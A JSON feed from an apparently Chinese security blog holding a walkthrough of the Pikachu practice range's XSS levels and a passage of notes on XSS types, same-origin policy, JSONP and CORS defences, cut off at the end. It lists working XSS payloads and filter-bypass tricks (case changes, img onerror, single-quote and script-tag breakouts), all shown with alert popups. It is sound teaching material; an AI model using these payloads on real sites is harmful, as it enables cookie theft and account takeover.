{
    "version": "https://jsonfeed.org/version/1",
    "title": "Khala • All posts by \"xss\" tag",
    "description": "GLHF",
    "home_page_url": "https://mobius-0.github.io",
    "items": [
        {
            "id": "https://mobius-0.github.io/security/pikachu/pikachu-xss/",
            "url": "https://mobius-0.github.io/security/pikachu/pikachu-xss/",
            "title": "pikachu-XSS",
            "date_published": "2022-12-03T12:20:55.000Z",
            "content_html": "<h1 id=\"反射型xssget\"><a class=\"anchor\" href=\"#反射型xssget\">#</a> 反射型 XSS（get）</h1>\n<h2 id=\"过程\"><a class=\"anchor\" href=\"#过程\">#</a> 过程</h2>\n<ol>\n<li>在输入框中输入任意字段，查看页面代码可以发现输入字段已经被插入到了页面之中</li>\n</ol>\n<p><img data-src=\"https://s2.loli.net/2022/12/03/V5JlmdS31TrwkxC.png\" alt=\"\" /></p>\n<ol start=\"2\">\n<li>这里可以尝试直接输入相应的 XSS payload，如</li>\n</ol>\n<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;\n&lt;details+open+ontoggle=prompt(1)&gt;\n&lt;svg/onload=confirm(1)&gt;\n</code></pre>\n<p>等</p>\n<ol start=\"3\">\n<li>输入的时候可以发现输入框有输入字符的上限（并且该输入框在测试时还可以发现其对输入字符髌骨无限制，特殊字符如 / 等可以直接插入到前端代码中），但这些不算很重要，我们可以直接在前端的代码上修改，也可以在网页的 url 上根据规律进行插入</li>\n</ol>\n<p><img data-src=\"https://s2.loli.net/2022/12/03/Vbk6tW7wDxhspGz.png\" alt=\"\" /></p>\n<ol start=\"4\">\n<li>反弹结果</li>\n</ol>\n<p><img data-src=\"https://s2.loli.net/2022/12/03/AB1TUmItyG54pMq.png\" alt=\"\" /></p>\n<p><img data-src=\"https://s2.loli.net/2022/12/03/OqeGpAaHP6uxFit.png\" alt=\"\" /></p>\n<h2 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h2>\n<p>GET 方式要更容易被利用，因为相关元素可以直接通过网页 URL 直接提交，通常的利用形式为将带有跨站脚本的 URL 伪装后发送给目标</p>\n<h1 id=\"反射型xsspost\"><a class=\"anchor\" href=\"#反射型xsspost\">#</a> 反射型 XSS（post）</h1>\n<h2 id=\"过程-2\"><a class=\"anchor\" href=\"#过程-2\">#</a> 过程</h2>\n<ol>\n<li>由于使用的是 post 方法，这里需要使用 burp suite 进行数据包的抓取</li>\n</ol>\n<p><img data-src=\"https://s2.loli.net/2022/12/03/ULb8cZdWiSGvr7P.png\" alt=\"\" /></p>\n<ol start=\"2\">\n<li>根据重放可知字符也已经插入页面代码</li>\n</ol>\n<p><img data-src=\"https://s2.loli.net/2022/12/03/I72ifcL89ymE1eR.png\" alt=\"\" /></p>\n<ol start=\"3\">\n<li>修改抓取的数据包，将 message 修改为 XSS 的 payload</li>\n</ol>\n<p><img data-src=\"https://s2.loli.net/2022/12/03/aBiIjJ1vV8hQkuC.png\" alt=\"\" /></p>\n<ol start=\"4\">\n<li>放行后输出结果，可以看到 payload 已经插入页面代码中</li>\n</ol>\n<p><img data-src=\"https://s2.loli.net/2022/12/03/QzElqaYN67yZdpF.png\" alt=\"\" /></p>\n<p><img data-src=\"https://s2.loli.net/2022/12/03/iMCDozdOaXBhxHm.png\" alt=\"\" /></p>\n<h2 id=\"总结-2\"><a class=\"anchor\" href=\"#总结-2\">#</a> 总结</h2>\n<p>POST 方式相对 GET 要更难被利用，但这同样存在安全隐患，这里就通过对数据包的篡改完成了 XSS 的 payload 插入，主要的利用方式会在 XSS 之盲打中会介绍</p>\n<h1 id=\"存储型xss\"><a class=\"anchor\" href=\"#存储型xss\">#</a> 存储型 XSS</h1>\n<h2 id=\"过程-3\"><a class=\"anchor\" href=\"#过程-3\">#</a> 过程</h2>\n<ol>\n<li>首先同样输入任意值，测试其是否存在对特殊字符的过滤</li>\n</ol>\n<p><img data-src=\"https://s2.loli.net/2022/12/03/dtBg7R6PXwze3Mv.png\" alt=\"\" /></p>\n<ol start=\"2\">\n<li>直接输入 XSS 的 payload，反弹结果，同时可以查看页面代码，发现 payload 已经被插入其中</li>\n</ol>\n<p><img data-src=\"https://s2.loli.net/2022/12/03/gxzHjGslwbOYSq9.png\" alt=\"\" /></p>\n<p><img data-src=\"https://s2.loli.net/2022/12/03/smBoa5QdLlWzgTf.png\" alt=\"\" /></p>\n<h2 id=\"总结-3\"><a class=\"anchor\" href=\"#总结-3\">#</a> 总结</h2>\n<p>存储型 XSS 在道理上和反射型差不多，区别在于存储型会被存储起来，而反射型则是一次性的</p>\n<h1 id=\"dom型xss\"><a class=\"anchor\" href=\"#dom型xss\">#</a> DOM 型 XSS</h1>\n<h2 id=\"过程-4\"><a class=\"anchor\" href=\"#过程-4\">#</a> 过程</h2>\n<ol>\n<li>同样首先输入任意字符，查看页面元素可知字符已被插入到前端中</li>\n</ol>\n<p><img data-src=\"https://s2.loli.net/2022/12/04/coW2JHhNR79Qv16.png\" alt=\"\" /></p>\n<ol start=\"2\">\n<li>输入 payload： <code>javascript:alert(1)</code>  尝试触发漏洞，查看页面元素可知 payload 已被插入到前端，点击 <code>what do you see？</code> 可以看到漏洞已触发</li>\n</ol>\n<p><img data-src=\"https://s2.loli.net/2022/12/04/qJwzxBHbT5e1jNm.png\" alt=\"\" /></p>\n<h2 id=\"总结-4\"><a class=\"anchor\" href=\"#总结-4\">#</a> 总结</h2>\n<p>这类型漏洞危害性不算非常大，但依旧需要留意</p>\n<h1 id=\"dom型xss-x\"><a class=\"anchor\" href=\"#dom型xss-x\">#</a> DOM 型 XSS-X</h1>\n<h2 id=\"过程-5\"><a class=\"anchor\" href=\"#过程-5\">#</a> 过程</h2>\n<ol>\n<li>与上一个关卡相同，先输入任意值，在页面元素中查看相关信息</li>\n</ol>\n<p><img data-src=\"https://s2.loli.net/2022/12/04/CoBtrZPh4djYGKw.png\" alt=\"\" /></p>\n<ol start=\"2\">\n<li>然后输入 payload 尝试触发漏洞，随后查看 payload 是否已经插入至页面元素中</li>\n</ol>\n<p><img data-src=\"https://s2.loli.net/2022/12/04/j98Bvde3KuTPcEx.png\" alt=\"\" /></p>\n<h2 id=\"总结-5\"><a class=\"anchor\" href=\"#总结-5\">#</a> 总结</h2>\n<p>这类型漏洞在某些方面与反射型 XSS 类似，它们同样都是通过 url 来获取输入，实际上在观察 url 内容后就可以发现 url 中有我们先前的输入 <code>javascript%3Aalert(1)</code> ，其中 <code>:</code>  在 url 内表现为 <code>%3A</code> ，这些符号都有固定的翻译对应，例如空格就会翻译为 <code>%20</code> 。</p>\n<h1 id=\"xss之盲打\"><a class=\"anchor\" href=\"#xss之盲打\">#</a> XSS 之盲打</h1>\n<h2 id=\"过程-6\"><a class=\"anchor\" href=\"#过程-6\">#</a> 过程</h2>\n<ol>\n<li>老规矩，先输入任意值，在前端代码中并没有看到相应的输出，所以这里需要登录管理后台查看结果</li>\n</ol>\n<p><img data-src=\"https://s2.loli.net/2022/12/04/WasLb8V4YG7tCju.png\" alt=\"\" /></p>\n<ol start=\"2\">\n<li>随后输入 payload <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>  尝试触发漏洞，由于前端并没有对应代码显示，所以需要到后台查看漏洞是否被触发。可以看到弹窗，漏洞已经被触发。</li>\n</ol>\n<p><img data-src=\"https://s2.loli.net/2022/12/04/9PvRs8C3tpLwmMy.png\" alt=\"\" /></p>\n<h2 id=\"总结-6\"><a class=\"anchor\" href=\"#总结-6\">#</a> 总结</h2>\n<p>盲打主要指的是这么一种攻击场景，前端输入的内容只有在后端才能看到，这类型的攻击通常具有随机性，首先输入框有可能存在对特殊字符和语句的过滤，导致跨站脚本上传失败，即使能够上传成功，在后端也有可能有过滤或验证，导致脚本不一定会被触发。但是危害同样很大，如果不存在上述验证，那么完全可以将脚本替换为获取 cookie 的脚本，如果管理员登陆就有可能会被盗取 cookie，导致管理权限的外泄。</p>\n<h1 id=\"xss过滤\"><a class=\"anchor\" href=\"#xss过滤\">#</a> XSS 过滤</h1>\n<h2 id=\"过程-7\"><a class=\"anchor\" href=\"#过程-7\">#</a> 过程</h2>\n<ol>\n<li>\n<p>依旧是老规矩，首先随意输入查看过滤情况，可以发现如 <code>&lt;script&gt;</code>  或双写关键词 <code>&lt;scrscriptipt&gt;</code>  等都被过滤掉了</p>\n</li>\n<li>\n<p>尝试修改 payload 格式，发现大写形式是不会被过滤的，写入后成功触发漏洞</p>\n</li>\n</ol>\n<p><img data-src=\"https://s2.loli.net/2022/12/04/x6XeM7ckWntEDhH.png\" alt=\"\" /></p>\n<p><img data-src=\"https://s2.loli.net/2022/12/04/vfBMTFm1Qa4qglS.png\" alt=\"\" /></p>\n<h2 id=\"总结-7\"><a class=\"anchor\" href=\"#总结-7\">#</a> 总结</h2>\n<p>这里漏洞的问题还是在于过滤的规则不够完善，查看源代码可以发现，实际上是只对 <code>&lt;script</code>  进行了过滤，简单点的绕过可以通过改变大小写来实现，同时也可以使用其他 payload 如 img 的标签 <code>&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</code>  来实现绕过</p>\n<h1 id=\"xss之htmlspecialchars\"><a class=\"anchor\" href=\"#xss之htmlspecialchars\">#</a> XSS 之 htmlspecialchars</h1>\n<h2 id=\"过程-8\"><a class=\"anchor\" href=\"#过程-8\">#</a> 过程</h2>\n<ol>\n<li>仍旧老规矩，随意输入字符，查看是否插入至前端中</li>\n</ol>\n<p><img data-src=\"https://s2.loli.net/2022/12/04/UKlvPJfGhw9qraN.png\" alt=\"\" /></p>\n<ol start=\"2\">\n<li>根据 htmlspecialchars 方法默认不对 <code>'</code>  进行处理的特点，我们可以构造 payload <code>1' oneclick='alert(1)'</code> ，输入后查看结果</li>\n</ol>\n<p><img data-src=\"https://s2.loli.net/2022/12/04/imwbCQnuKe5stIf.png\" alt=\"\" /></p>\n<p><img data-src=\"https://s2.loli.net/2022/12/04/Q8Hi6MuhG2zmelE.png\" alt=\"\" /></p>\n<h2 id=\"总结-8\"><a class=\"anchor\" href=\"#总结-8\">#</a> 总结</h2>\n<p>htmlspecialchars () 函数功能为把预定的字符转换为 HTML 实体，当前预定义的字符有：</p>\n<pre><code> &amp; → &amp;amp\n &quot; → &amp;quot\n ' → &amp;apos\n &lt; → &amp;lt\n &gt; → &amp;gt\n</code></pre>\n<h1 id=\"xss之href输出\"><a class=\"anchor\" href=\"#xss之href输出\">#</a> XSS 之 href 输出</h1>\n<h2 id=\"过程-9\"><a class=\"anchor\" href=\"#过程-9\">#</a> 过程</h2>\n<ol>\n<li>随意输入字符，查看页面源代码插入位置</li>\n</ol>\n<p><img data-src=\"https://s2.loli.net/2022/12/04/ZAHn1MfB73sbXTz.png\" alt=\"\" /></p>\n<ol start=\"2\">\n<li>此处可以直接构造 payload <code>javascript:alert(1)</code> ，输入后查看结果</li>\n</ol>\n<p><img data-src=\"https://s2.loli.net/2022/12/04/3XBuyI1HLkNDaMT.png\" alt=\"\" /></p>\n<p><img data-src=\"https://s2.loli.net/2022/12/04/qBDJt5mx3flyzCF.png\" alt=\"\" /></p>\n<h2 id=\"总结-9\"><a class=\"anchor\" href=\"#总结-9\">#</a> 总结</h2>\n<p>这个漏洞比较简单，此处我们可以只允许 http、https，其次再进行 htmlspecialchars 处理</p>\n<h1 id=\"xss之js输出\"><a class=\"anchor\" href=\"#xss之js输出\">#</a> XSS 之 js 输出</h1>\n<h2 id=\"过程-10\"><a class=\"anchor\" href=\"#过程-10\">#</a> 过程</h2>\n<ol>\n<li>首先随意输入字符，发现代码中使用 $ms 来传递参数</li>\n</ol>\n<p><img data-src=\"https://s2.loli.net/2022/12/04/m3NqsvaHCuiAyZY.png\" alt=\"\" /></p>\n<ol start=\"2\">\n<li>构造 payload 尝试闭合掉下方的 if 判断句 <code>1'&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></li>\n</ol>\n<p><img data-src=\"https://s2.loli.net/2022/12/04/2lPxNofSVdvamrB.png\" alt=\"\" /></p>\n<p><img data-src=\"https://s2.loli.net/2022/12/04/yjbYkTQBXlG7zWg.png\" alt=\"\" /></p>\n<h2 id=\"总结-10\"><a class=\"anchor\" href=\"#总结-10\">#</a> 总结</h2>\n<p>这里主要的操作是再输入框后增加前端代码完成对原有代码的闭合，将原来的判断语句直接排除在外，这样就避免了 if 的验证，实现绕过。</p>\n",
            "tags": [
                "漏洞",
                "渗透测试",
                "靶场",
                "pikachu",
                "XSS"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/XSS/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/XSS/",
            "title": "XSS",
            "date_published": "2022-11-26T03:55:09.000Z",
            "content_html": "<h1 id=\"分类\"><a class=\"anchor\" href=\"#分类\">#</a> 分类</h1>\n<h2 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h2>\n<p>XSS 全称为 Cross Site Scripting，为了和 CSS 分开简写为 XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了不在预期过程中的 JavaScript 代码执行。XSS 通常被用于获取 Cookie、以受攻击者的身份进行操作等行为。</p>\n<h2 id=\"反射型xss\"><a class=\"anchor\" href=\"#反射型xss\">#</a> 反射型 XSS</h2>\n<p>反射型 XSS 是比较常见和广泛的一类，举例来说，当一个网站的代码中包含类似下面的语句： <code>&lt;?php echo &quot;&lt;p&gt;hello, $_GET['user']&lt;/p&gt;&quot;;?&gt;</code>  ，那么在访问时设置  <code>/?user=&lt;/p&gt;&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;&lt;p&gt;</code>  ，则可执行预设好的 JavaScript 代码。</p>\n<p>反射型 XSS 通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到 XSS Auditor、NoScript 等防御手段的影响较大。</p>\n<h2 id=\"储存型xss\"><a class=\"anchor\" href=\"#储存型xss\">#</a> 储存型 XSS</h2>\n<p>储存型 XSS 相比反射型来说危害较大，在这种漏洞中，攻击者能够把攻击载荷存入服务器的数据库中，造成持久化的攻击。</p>\n<h2 id=\"dom-xss\"><a class=\"anchor\" href=\"#dom-xss\">#</a> DOM XSS</h2>\n<p>DOM 型 XSS 不同之处在于 DOM 型 XSS 一般和服务器的解析响应没有直接关系，而是在 JavaScript 脚本动态执行的过程中产生的。</p>\n<p>例如</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>DOM Based XSS Demo<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">xsstest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">var</span> str <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"input\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"output\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> <span class=\"token string\">\"&lt;img src='\"</span><span class=\"token operator\">+</span>str<span class=\"token operator\">+</span><span class=\"token string\">\"'>&lt;/img>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>output<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>input<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">size</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>50</span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>button<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token special-attr\"><span class=\"token attr-name\">onclick</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\"><span class=\"token function\">xsstest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">\"</span></span></span> <span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>输入  <code>x' onerror='javascript:alert(/xss/)</code>  即可触发。</p>\n<h2 id=\"blind-xss\"><a class=\"anchor\" href=\"#blind-xss\">#</a> Blind XSS</h2>\n<p>Blind XSS 是储存型 XSS 的一种，它保存在某些存储中，当一个 “受害者” 访问这个页面时执行，并且在文档对象模型 (DOM) 中呈现 payload。 它被称为 Blind 的原因是因为它通常发生在通常不暴露给用户的功能上。</p>\n<h1 id=\"危害\"><a class=\"anchor\" href=\"#危害\">#</a> 危害</h1>\n<p>存在 XSS 漏洞时，可能会导致以下几种情况：</p>\n<ol>\n<li>用户的 Cookie 被获取，其中可能存在 Session ID 等敏感信息。若服务器端没有做相应防护，攻击者可用对应 Cookie 登陆服务器。</li>\n<li>攻击者能够在一定限度内记录用户的键盘输入。</li>\n<li>攻击者通过 CSRF 等方式以用户身份执行危险操作。</li>\n<li>XSS 蠕虫。</li>\n<li>获取用户浏览器信息。</li>\n<li>利用 XSS 漏洞扫描用户内网。</li>\n</ol>\n<h1 id=\"同源策略\"><a class=\"anchor\" href=\"#同源策略\">#</a> 同源策略</h1>\n<h2 id=\"简介-2\"><a class=\"anchor\" href=\"#简介-2\">#</a> 简介</h2>\n<p>同源策略限制了不同源之间如何进行资源交互，是用于隔离潜在恶意文件的重要安全机制。 是否同源由 URL 决定，URL 由协议、域名、端口和路径组成，如果两个 URL 的协议、域名和端口相同，则表示他们同源。</p>\n<h3 id=\"file域的同源策略\"><a class=\"anchor\" href=\"#file域的同源策略\">#</a> file 域的同源策略</h3>\n<p>在之前的浏览器中，任意两个 file 域的 URI 被认为是同源的。本地磁盘上的任何 HTML 文件都可以读取本地磁盘上的任何其他文件。</p>\n<p>从 Gecko 1.9 开始，文件使用了更细致的同源策略，只有当源文件的父目录是目标文件的祖先目录时，文件才能读取另一个文件。</p>\n<h3 id=\"cookie的同源策略\"><a class=\"anchor\" href=\"#cookie的同源策略\">#</a> cookie 的同源策略</h3>\n<p>cookie 使用不同的源定义方式，一个页面可以为本域和任何父域设置 cookie，只要是父域不是公共后缀 (public suffix) 即可。</p>\n<p>不管使用哪个协议 (HTTP/HTTPS) 或端口号，浏览器都允许给定的域以及其任何子域名访问 cookie。设置 cookie 时，可以使用  <code>domain</code>  /  <code>path</code>  /  <code>secure</code>  和  <code>http-only</code>  标记来限定其访问性。</p>\n<p>所以  <code>https://localhost:8080/</code>  和  <code>http://localhost:8081/</code>  的 Cookie 是共享的。</p>\n<h3 id=\"flashsilverlight跨域\"><a class=\"anchor\" href=\"#flashsilverlight跨域\">#</a> Flash/SilverLight 跨域</h3>\n<p>浏览器的各种插件也存在跨域需求。通常是通过在服务器配置 crossdomain.xml，设置本服务允许哪些域名的跨域访问。</p>\n<p>客户端会请求此文件，如果发现自己的域名在访问列表里，就发起真正的请求，否则不发送请求。</p>\n<h2 id=\"源的更改\"><a class=\"anchor\" href=\"#源的更改\">#</a> 源的更改</h2>\n<p>同源策略认为域和子域属于不同的域，例如  <code>child1.a.com</code>  与  <code>a.com</code>  /  <code>child1.a.com</code>  与  <code>child2.a.com</code>  /  <code>xxx.child1.a.com</code>  与  <code>child1.a.com</code>  两两不同源。</p>\n<p>对于这种情况，可以在两个方面各自设置  <code>document.domain='a.com'</code>  来改变其源来实现以上任意两个页面之间的通信。</p>\n<p>另外因为浏览器单独保存端口号，这种赋值会导致端口号被重写为  <code>null</code>  。</p>\n<h2 id=\"跨源访问\"><a class=\"anchor\" href=\"#跨源访问\">#</a> 跨源访问</h2>\n<p>同源策略控制了不同源之间的交互，这些交互通常分为三类：</p>\n<ul>\n<li>通常允许跨域写操作 (Cross-origin writes)\n<ul>\n<li>链接 (links)</li>\n<li>重定向</li>\n<li>表单提交</li>\n</ul>\n</li>\n<li>通常允许跨域资源嵌入 (Cross-origin embedding)</li>\n<li>通常不允许跨域读操作 (Cross-origin reads)</li>\n</ul>\n<p>可能嵌入跨源的资源的一些示例有：</p>\n<ul>\n<li><code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;</code>  标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。</li>\n<li><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;</code>  标签嵌入 CSS。由于 CSS 的松散的语法规则，CSS 的跨域需要一个设置正确的 Content-Type 消息头。</li>\n<li><code>&lt;img&gt;</code>  /  <code>&lt;video&gt;</code>  /  <code>&lt;audio&gt;</code>  嵌入多媒体资源。</li>\n<li><code>&lt;object&gt;</code>   <code>&lt;embed&gt;</code>  和  <code>&lt;applet&gt;</code>  的插件。</li>\n<li><code>@font-face</code>  引入的字体。一些浏览器允许跨域字体 (cross-origin fonts)，一些需要同源字体 (same-origin fonts)。</li>\n<li><code>&lt;frame&gt;</code>  和  <code>&lt;iframe&gt;</code>  载入的任何资源。站点可以使用 X-Frame-Options 消息头来阻止这种形式的跨域交互。</li>\n</ul>\n<h3 id=\"jsonp跨域\"><a class=\"anchor\" href=\"#jsonp跨域\">#</a> JSONP 跨域</h3>\n<p>JSONP 就是利用  <code>&lt;script&gt;</code>  标签的跨域能力实现跨域数据的访问，请求动态生成的 JavaScript 脚本同时带一个 callback 函数名作为参数。</p>\n<p>服务端收到请求后，动态生成脚本产生数据，并在代码中以产生的数据为参数调用 callback 函数。</p>\n<p>JSONP 也存在一些安全问题，例如当对传入 / 传回参数没有做校验就直接执行返回的时候，会造成 XSS 问题。没有做 Referer 或 Token 校验就给出数据的时候，可能会造成数据泄露。</p>\n<p>另外 JSONP 在没有设置 callback 函数的白名单情况下，可以合法的做一些设计之外的函数调用，引入问题。这种攻击也被称为 SOME 攻击。</p>\n<h3 id=\"跨源脚本api访问\"><a class=\"anchor\" href=\"#跨源脚本api访问\">#</a> 跨源脚本 API 访问</h3>\n<p>Javascript 的 APIs 中，如  <code>iframe.contentWindow</code>  ,  <code>window.parent</code> ,  <code>window.open</code>  和  <code>window.opener</code>  允许文档间相互引用。当两个文档的源不同时，这些引用方式将对  <code>window</code>  和  <code>location</code>  对象的访问添加限制。</p>\n<p><code>window</code>  允许跨源访问的方法有</p>\n<ul>\n<li>window.blur</li>\n<li>window.close</li>\n<li>window.focus</li>\n<li>window.postMessage</li>\n</ul>\n<p><code>window</code>  允许跨源访问的属性有</p>\n<ul>\n<li>window.closed</li>\n<li>window.frames</li>\n<li>window.length</li>\n<li>window.location</li>\n<li>window.opener</li>\n<li>window.parent</li>\n<li>window.self</li>\n<li>window.top</li>\n<li>window.window</li>\n</ul>\n<p>其中  <code>window.location</code>  允许读 / 写，其他的属性只允许读</p>\n<h3 id=\"跨源数据存储访问\"><a class=\"anchor\" href=\"#跨源数据存储访问\">#</a> 跨源数据存储访问</h3>\n<p>存储在浏览器中的数据，如  <code>localStorage</code>  和  <code>IndexedDB</code> ，以源进行分割。每个源都拥有自己单独的存储空间，一个源中的 Javascript 脚本不能对属于其它源的数据进行读写操作。</p>\n<h2 id=\"cors\"><a class=\"anchor\" href=\"#cors\">#</a> CORS</h2>\n<p>CORS 是一个 W3C 标准，全称是跨域资源共享 (Cross-origin resource sharing)。通过这个标准，可以允许浏览器读取跨域的资源。</p>\n<h3 id=\"常见请求头\"><a class=\"anchor\" href=\"#常见请求头\">#</a> 常见请求头</h3>\n<ul>\n<li>Origin\n<ul>\n<li>预检请求或实际请求的源站 URI, 浏览器请求默认会发送该字段</li>\n<li><code>Origin: &lt;origin&gt;</code></li>\n</ul>\n</li>\n<li>Access-Control-Request-Method\n<ul>\n<li>声明请求使用的方法</li>\n<li><code>Access-Control-Request-Method: &lt;method&gt;</code></li>\n</ul>\n</li>\n<li>Access-Control-Request-Headers\n<ul>\n<li>声明请求使用的 header 字段</li>\n<li><code>Access-Control-Request-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*</code></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"常见返回头\"><a class=\"anchor\" href=\"#常见返回头\">#</a> 常见返回头</h3>\n<ul>\n<li>Access-Control-Allow-Origin\n<ul>\n<li>声明允许访问的源外域 URI</li>\n<li>对于携带身份凭证的请求不可使用通配符</li>\n<li><code>*``Access-Control-Allow-Origin: &lt;origin&gt; | *</code></li>\n</ul>\n</li>\n<li>Access-Control-Expose-Headers\n<ul>\n<li>声明允许暴露的头</li>\n<li>e.g.  <code>Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header</code></li>\n</ul>\n</li>\n<li>Access-Control-Max-Age\n<ul>\n<li>声明 Cache 时间</li>\n<li><code>Access-Control-Max-Age: &lt;delta-seconds&gt;</code></li>\n</ul>\n</li>\n<li>Access-Control-Allow-Credentials\n<ul>\n<li>声明是否允许在请求中带入</li>\n<li><code>Access-Control-Allow-Credentials: true</code></li>\n</ul>\n</li>\n<li>Access-Control-Allow-Methods\n<ul>\n<li>声明允许的访问方式</li>\n<li><code>Access-Control-Allow-Methods: &lt;method&gt;[, &lt;method&gt;]*</code></li>\n</ul>\n</li>\n<li>Access-Control-Allow-Headers\n<ul>\n<li>声明允许的头</li>\n<li><code>Access-Control-Allow-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*</code></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"防御建议\"><a class=\"anchor\" href=\"#防御建议\">#</a> 防御建议</h3>\n<ul>\n<li>如非必要不开启 CORS</li>\n<li>定义详细的白名单，不使用通配符，仅配置所需要的头</li>\n<li>配置  <code>Vary: Origin</code>  头部</li>\n<li>如非必要不使用  <code>Access-Control-Allow-Credentials</code></li>\n<li>限制缓存的时间</li>\n</ul>\n<h2 id=\"阻止跨源访问\"><a class=\"anchor\" href=\"#阻止跨源访问\">#</a> 阻止跨源访问</h2>\n<p>阻止跨域写操作，可以检测请求中的  <code>CSRF token</code>  ，这个标记被称为 Cross-Site Request Forgery (CSRF) 标记。</p>\n<p>阻止资源的跨站读取，因为嵌入资源通常会暴露信息，需要保证资源是不可嵌入的。但是多数情况下浏览器都不会遵守  <code>Content-Type</code>  消息头。例如如果在 HTML 文档中指定  <code>&lt;script&gt;</code>  标记，则浏览器会尝试将 HTML 解析为 JavaScript。</p>\n<h1 